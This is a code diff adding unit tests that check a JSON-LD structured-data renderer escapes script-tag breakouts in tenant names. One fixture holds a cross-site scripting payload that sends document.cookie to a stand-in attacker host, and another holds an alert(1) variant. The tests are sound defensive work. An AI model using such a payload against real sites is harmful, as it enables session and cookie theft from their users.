@@ -4,6 +4,7 @@ import {
   buildBreadcrumbList,
   buildWebSite,
   buildOrganization,
+  renderStructuredData,
 } from '@/lib/seo/structured-data'
 import type { PublicTenant } from '@/modules/tenants/public.service'
 
@@ -120,5 +121,29 @@ describe('buildOrganization', () => {
     expect(node.name).toBe('TurnoGol')
     expect(node.url).toBeDefined()
     expect(node.logo).toBeDefined()
+  })
+})
+
+describe('renderStructuredData', () => {
+  it('escapes a literal </script> in free-text tenant fields so it cannot break out of the JSON-LD <script> tag', () => {
+    const node = buildLocalBusiness({
+      ...FIXTURE_TENANT,
+      name: "Cancha</script><script>fetch('https://evil.example/c?d='+document.cookie)</script>",
+    })
+    const html = renderStructuredData(node)
+    expect(html).not.toContain('</script>')
+    expect(html).not.toContain('<script>')
+    expect(html).not.toContain('<')
+    expect(html).not.toContain('>')
+  })
+
+  it('still serializes to valid JSON that round-trips to the original data', () => {
+    const node = buildLocalBusiness({
+      ...FIXTURE_TENANT,
+      name: "Cancha</script><script>alert(1)</script>",
+      address: 'Av. Libertador 1234',
+    })
+    const html = renderStructuredData(node)
+    expect(JSON.parse(html)).toEqual(node)
   })
 })
